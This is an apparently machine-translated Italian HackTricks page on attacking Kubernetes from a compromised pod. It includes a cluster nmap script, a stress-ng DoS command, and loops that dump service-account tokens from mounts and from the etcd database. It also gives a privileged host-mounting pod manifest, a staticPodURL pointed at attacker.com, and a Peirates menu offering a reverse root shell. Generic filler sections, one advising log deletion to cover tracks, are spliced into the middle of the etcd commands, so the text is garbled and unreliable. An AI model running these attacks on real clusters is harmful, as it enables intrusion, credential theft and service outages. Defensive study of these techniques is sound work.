# Attacking Kubernetes from inside a Pod

## Attaccare Kubernetes da dentro un Pod

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

### **Fuga dal Pod**

**Se hai abbastanza fortuna, potresti riuscire a scappare verso il nodo:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

#### Fuga dal pod

Per cercare di fuggire dal pod potresti aver bisogno di **aumentare i privilegi** prima, alcune tecniche per farlo:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Puoi controllare questi **escape da docker per cercare di fuggire** da un pod che hai compromesso:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

#### Abuso dei privilegi di Kubernetes

Come spiegato nella sezione sull'**enumerazione di Kubernetes**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Di solito i pod vengono eseguiti con un **token dell'account di servizio** al loro interno. Questo account di servizio potrebbe avere alcuni **privilegi associati** che potresti **abusare** per **spostarti** su altri pod o addirittura per **scappare** verso i nodi configurati all'interno del cluster. Scopri come in:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

#### Abuso dei privilegi del cloud

Se il pod viene eseguito all'interno di un **ambiente cloud**, potresti essere in grado di **ottenere un token dal punto di accesso dei metadati** e aumentare i privilegi utilizzandolo.

### Ricerca di servizi di rete vulnerabili

Essendo all'interno dell'ambiente Kubernetes, se non riesci ad aumentare i privilegi sfruttando i privilegi attuali dei pod e non riesci a fuggire dal contenitore, dovresti **cercare potenziali servizi vulnerabili.**

#### Servizi

**A questo scopo, puoi provare a ottenere tutti i servizi dell'ambiente Kubernetes:**

```
kubectl get svc --all-namespaces
```

Di default, Kubernetes utilizza uno schema di rete piatto, il che significa che **qualsiasi pod/servizio all'interno del cluster pu√≤ comunicare con gli altri**. I **namespace** all'interno del cluster **non hanno restrizioni di sicurezza di rete di default**. Chiunque nel namespace pu√≤ comunicare con altri namespace.

#### Scansione

Lo script Bash seguente (preso da un [workshop su Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) installer√† e scannerizzer√† gli intervalli di indirizzi IP del cluster Kubernetes:

```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```

Date un'occhiata alla seguente pagina per imparare come potete **attaccare i servizi specifici di Kubernetes** per **compromettere altri pod/tutto l'ambiente**:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

#### Sniffing

Nel caso in cui il **pod compromesso stia eseguendo un servizio sensibile** in cui gli altri pod devono autenticarsi, potreste essere in grado di ottenere le credenziali inviate dagli altri pod **sniffando le comunicazioni locali**.

### Network Spoofing

Per impostazione predefinita, tecniche come **ARP spoofing** (e grazie a questo **DNS spoofing**) funzionano nella rete di Kubernetes. Quindi, all'interno di un pod, se avete la **capacit√† NET\_RAW** (che √® presente per impostazione predefinita), sarete in grado di inviare pacchetti di rete personalizzati e eseguire **attacchi MitM tramite ARP spoofing a tutti i pod in esecuzione nello stesso nodo**.\
Inoltre, se il **pod malevolo** sta eseguendo nello **stesso nodo del server DNS**, sarete in grado di eseguire un **attacco di DNS spoofing a tutti i pod nel cluster**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

### Node DoS

Non c'√® una specifica delle risorse nei manifest di Kubernetes e **non vengono applicati limiti** per i contenitori. Come attaccante, possiamo **consumare tutte le risorse in cui il pod/deployment sta eseguendo** e privare di risorse altre risorse e causare un DoS per l'ambiente.

Questo pu√≤ essere fatto con uno strumento come [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):

```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```

Puoi notare la differenza mentre esegui `stress-ng` e dopo

```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```

### Post-Esploitation del Nodo

Se sei riuscito a **uscire dal container**, troverai alcune cose interessanti nel nodo:

* Il processo **Container Runtime** (Docker)
* Altri **pods/containers** in esecuzione nel nodo che puoi sfruttare come questo (pi√π token)
* L'intero **filesystem** e il **sistema operativo** in generale
* Il servizio **Kube-Proxy** in ascolto
* Il servizio **Kubelet** in ascolto. Controlla i file di configurazione:
* Directory: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* Altri **file comuni di Kubernetes**:
* `$HOME/.kube/config` - **Configurazione utente**
* `/etc/kubernetes/kubelet.conf`- **Configurazione regolare**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **Configurazione di bootstrap**
* `/etc/kubernetes/manifests/etcd.yaml` - **Configurazione di etcd**
* `/etc/kubernetes/pki` - **Chiave di Kubernetes**

#### Trova il kubeconfig del nodo

Se non riesci a trovare il file kubeconfig in uno dei percorsi precedentemente commentati, **controlla l'argomento `--kubeconfig` del processo kubelet**:

```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```

#### Rubare Segreti

To steal secrets from within a Kubernetes pod, you can use various techniques:

**1. Environment Variables**

If the application running inside the pod uses environment variables to store sensitive information, you can access these variables from within the pod and extract the secrets.

**2. Mounted Volumes**

If the pod has a mounted volume that contains sensitive files, you can access and copy these files to retrieve the secrets.

**3. API Access**

If the pod has access to the Kubernetes API, you can use this access to retrieve secrets stored in Kubernetes secrets or config maps.

**4. Service Account Tokens**

If the pod is using a service account with sufficient privileges, you can use the service account token to authenticate with the Kubernetes API and retrieve secrets.

**5. Exploiting Vulnerabilities**

If the pod or the underlying container runtime has any known vulnerabilities, you can exploit these vulnerabilities to gain unauthorized access and retrieve secrets.

Remember to always follow ethical guidelines and obtain proper authorization before attempting any of these techniques.

```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```

Lo script [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) recuperer√† automaticamente **i token di altri pod e verificher√† se hanno i permessi** che stai cercando (al posto di doverli cercare uno per uno):

```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```

#### DaemonSets privilegiati

Un DaemonSet √® un **pod** che verr√† **eseguito** in **tutti i nodi del cluster**. Pertanto, se un DaemonSet √® configurato con un **account di servizio privilegiato**, in **TUTTI i nodi** sar√† possibile trovare il **token** di quell'**account di servizio privilegiato** che potrebbe essere abusato.

Lo sfruttamento √® lo stesso della sezione precedente, ma ora non dipendi pi√π dalla fortuna.

#### Passaggio al Cloud

Se il cluster √® gestito da un servizio cloud, di solito il **Nodo avr√† un accesso diverso all'endpoint dei metadati** rispetto al Pod. Pertanto, prova ad **accedere all'endpoint dei metadati dal nodo** (o da un pod con hostNetwork impostato su True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

#### Rubare etcd

Se √® possibile specificare il [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) del Nodo che eseguir√† il container, ottieni una shell all'interno di un nodo di controllo e ottieni il **database etcd**:

```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```

I nodi di controllo hanno il **ruolo di master** e nei **cluster gestiti dal cloud non sar√† possibile eseguire nulla su di essi**.

**Leggere le segrete da etcd**

Se puoi eseguire il tuo pod su un nodo di controllo utilizzando il selettore `nodeName` nelle specifiche del pod, potresti avere un facile accesso al database `etcd`, che contiene tutte le configurazioni del cluster, comprese tutte le segrete.

Di seguito √® riportato un modo rapido e sporco per ottenere le segrete da `etcd` se viene eseguito sul nodo di controllo su cui ti trovi. Se desideri una soluzione pi√π elegante che avvia un pod con l'utilit√† client `etcd` `etcdctl` e utilizza le credenziali del nodo di controllo per connettersi a etcd ovunque sia in esecuzione, dai un'occhiata a [questo esempio di manifesto](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) di @mauilion.

**Controlla se `etcd` √® in esecuzione sul nodo di controllo e verifica dove si trova il database (Questo √® su un cluster creato con `kubeadm`)**

```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```

## Attaccare Kubernetes dall'interno di un Pod

In alcuni scenari di pentesting, potresti trovare una vulnerabilit√† all'interno di un Pod Kubernetes e desiderare di sfruttarla per attaccare il cluster Kubernetes stesso. Questo articolo ti guider√† attraverso i passaggi necessari per attaccare Kubernetes dall'interno di un Pod.

### 1. Ottenere l'accesso al Pod

Prima di tutto, devi ottenere l'accesso al Pod vulnerabile. Ci sono diverse tecniche che puoi utilizzare per raggiungere questo obiettivo, come l'esecuzione di un attacco di injection o l'abuso di una vulnerabilit√† di escalation dei privilegi.

### 2. Esplorare il cluster Kubernetes

Una volta all'interno del Pod, puoi iniziare ad esplorare il cluster Kubernetes. Puoi utilizzare strumenti come `kubectl` per ottenere informazioni sul cluster, come i nodi, i servizi e le configurazioni.

### 3. Sfruttare le vulnerabilit√† del cluster

Una volta che hai una panoramica del cluster, puoi cercare vulnerabilit√† specifiche che possono essere sfruttate per ottenere un accesso pi√π ampio o per compromettere il cluster. Alcune vulnerabilit√† comuni includono l'abuso di autorizzazioni errate, l'esposizione di endpoint sensibili o la mancanza di autenticazione adeguata.

### 4. Eseguire attacchi all'interno del cluster

Una volta che hai identificato una vulnerabilit√†, puoi eseguire attacchi all'interno del cluster Kubernetes. Ad esempio, potresti cercare di eseguire comandi arbitrari sui nodi del cluster o di compromettere i servizi in esecuzione.

### 5. Coprire le tracce

Infine, √® importante coprire le tracce del tuo attacco per evitare di essere scoperto. Puoi eliminare i log o modificare le registrazioni per nascondere le tue azioni.

### Conclusioni

Attaccare Kubernetes dall'interno di un Pod pu√≤ essere un modo efficace per compromettere un cluster Kubernetes. Tuttavia, √® importante ricordare che l'attacco a un sistema senza autorizzazione √® illegale e pu√≤ comportare conseguenze legali. Assicurati di ottenere sempre il consenso del proprietario del sistema prima di eseguire qualsiasi attivit√† di pentesting.

```bash
data-dir=/var/lib/etcd
```

**Visualizza i dati nel database etcd:**

```bash
strings /var/lib/etcd/member/snap/db | less
```

**Estrai i token dal database e mostra il nome dell'account di servizio**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```

**Stesso comando, ma con alcuni greps per restituire solo il token predefinito nel namespace kube-system**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```

## Attaccare Kubernetes dall'interno di un Pod

Quando si esegue il penetration testing su un cluster Kubernetes, √® importante comprendere come un attaccante potrebbe sfruttare un Pod compromesso per attaccare il cluster stesso. In questo articolo, esploreremo alcune tecniche comuni utilizzate dagli hacker per attaccare Kubernetes dall'interno di un Pod compromesso.

### 1. Fuga dal Pod

Se un attaccante riesce a compromettere un Pod all'interno del cluster, potrebbe cercare di fuggire dal Pod per ottenere accesso al nodo sottostante o ad altri Pod nel cluster. Ci sono diverse tecniche che un attaccante potrebbe utilizzare per fuggire dal Pod:

* **Montaggio del file system host**: Un attaccante potrebbe cercare di montare il file system host all'interno del Pod per accedere ai file del nodo sottostante.
* **Utilizzo di privilegi elevati**: Se un Pod viene eseguito con privilegi elevati, un attaccante potrebbe sfruttare questi privilegi per ottenere accesso al nodo sottostante o ad altri Pod.
* **Utilizzo di vulnerabilit√† del kernel**: Un attaccante potrebbe cercare di sfruttare vulnerabilit√† del kernel per ottenere accesso al nodo sottostante o ad altri Pod.

### 2. Attacco ad altri Pod

Una volta che un attaccante ha ottenuto accesso a un Pod compromesso, potrebbe cercare di attaccare altri Pod all'interno del cluster. Alcuni possibili attacchi includono:

* **Attacco di rete**: Un attaccante potrebbe cercare di eseguire un attacco di rete all'interno del cluster per compromettere altri Pod.
* **Attacco di escalation dei privilegi**: Se un attaccante riesce a ottenere accesso a un Pod con privilegi elevati, potrebbe cercare di eseguire un attacco di escalation dei privilegi per ottenere accesso ad altri Pod con privilegi elevati.
* **Attacco di injection**: Un attaccante potrebbe cercare di eseguire un attacco di injection per compromettere altri Pod nel cluster.

### 3. Accesso alle risorse del cluster

Una volta che un attaccante ha ottenuto accesso a un Pod compromesso, potrebbe cercare di accedere alle risorse del cluster, come i segreti o le configurazioni sensibili. Alcuni possibili metodi includono:

* **Accesso ai segreti**: Un attaccante potrebbe cercare di accedere ai segreti memorizzati nel cluster per ottenere informazioni sensibili.
* **Accesso alle configurazioni**: Un attaccante potrebbe cercare di accedere alle configurazioni del cluster per ottenere informazioni sensibili o per modificare il comportamento del cluster.

### Conclusioni

Comprendere come un attaccante potrebbe sfruttare un Pod compromesso per attaccare Kubernetes √® fondamentale per garantire la sicurezza del cluster. Implementare le misure di sicurezza appropriate, come la limitazione dei privilegi dei Pod e la gestione adeguata dei segreti, pu√≤ contribuire a mitigare questi rischi.

```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```

#### Persistenza dei Pod Statici/Riflessi

I _Pod Statici_ sono gestiti direttamente dal demone kubelet su un nodo specifico, senza che il server API li osservi. A differenza dei Pod gestiti dal controllo del cluster (ad esempio, un Deployment); invece, **il kubelet osserva ogni Pod statico** (e lo riavvia se fallisce).

Di conseguenza, i Pod statici sono sempre **vincolati a un solo Kubelet** su un nodo specifico.

Il **kubelet cerca automaticamente di creare un Pod speculare sul server API di Kubernetes** per ogni Pod statico. Ci√≤ significa che i Pod in esecuzione su un nodo sono visibili sul server API, ma non possono essere controllati da l√¨. I nomi dei Pod saranno suffissati con il nome host del nodo con un trattino iniziale.

{% hint style="danger" %}
Lo **`spec` di un Pod statico non pu√≤ fare riferimento ad altri oggetti API** (ad esempio, ServiceAccount, ConfigMap, Secret, ecc.). Quindi **non √® possibile sfruttare questo comportamento per avviare un pod con un serviceAccount arbitrario** nel nodo corrente per compromettere il cluster. Ma potresti usarlo per eseguire pod in diversi namespace (nel caso sia utile per qualche motivo).
{% endhint %}

Se ti trovi all'interno dell'host del nodo, puoi farlo creare un **pod statico al suo interno**. Questo √® molto utile perch√© potrebbe consentirti di **creare un pod in un diverso namespace** come **kube-system**.

Per creare un pod statico, la [**documentazione √® di grande aiuto**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Fondamentalmente hai bisogno di 2 cose:

* Configurare il parametro **`--pod-manifest-path=/etc/kubernetes/manifests`** nel servizio **kubelet**, o nella configurazione del **kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) e riavviare il servizio
* Creare la definizione del **pod** nella **definizione del pod** in **`/etc/kubernetes/manifests`**

Un'**altra modalit√† pi√π stealth sarebbe**:

* Modificare il parametro **`staticPodURL`** nel file di configurazione di **kubelet** e impostarlo su qualcosa come `staticPodURL: http://attacker.com:8765/pod.yaml`. Ci√≤ far√† s√¨ che il processo kubelet crei un **pod statico** ottenendo la **configurazione dall'URL indicato**.

**Esempio** di **configurazione del pod** per creare un pod con privilegi in **kube-system** preso da [**qui**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):

```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```

#### Eliminare pod + nodi non schedulabili

Se un attaccante ha **compromesso un nodo** e pu√≤ **eliminare i pod** da altri nodi e **rendere altri nodi non in grado di eseguire i pod**, i pod verranno eseguiti nuovamente nel nodo compromesso e sar√† in grado di **rubare i token** eseguiti in essi.\
Per [**ulteriori informazioni seguire questi link**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

### Strumenti automatici

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)

```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```

* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) su GitHub.

</details>
